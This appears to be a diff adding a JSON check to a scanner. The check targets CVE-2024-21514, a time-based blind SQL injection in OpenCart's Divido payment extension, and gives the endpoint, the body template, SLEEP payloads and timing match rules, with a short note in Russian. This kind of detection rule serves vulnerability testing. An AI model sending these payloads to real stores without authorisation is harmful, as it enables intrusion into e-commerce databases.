@@ -1,0 +1,13 @@
+{
+  "id": "opencart-divido-sqli",
+  "engine": "opencart",
+  "method": "POST",
+  "path": "/index.php?route=extension/payment/divido/update",
+  "where": "post-json",
+  "body_tpl": "{\"status\":true,\"metadata\":{\"order_id\":\"{{p}}\"}}",
+  "payloads": ["1", "(SELECT SLEEP(5))", "(SELECT SLEEP(8))"],
+  "match": { "type": "time", "value": 4 },
+  "skip_if": ["oc_divido_lookup' doesn't exist", "Table 'snthsrvs.oc_divido_lookup"],
+  "score": 6,
+  "note": "CVE-2024-21514, слепая по времени, таблица должна существовать"
+}
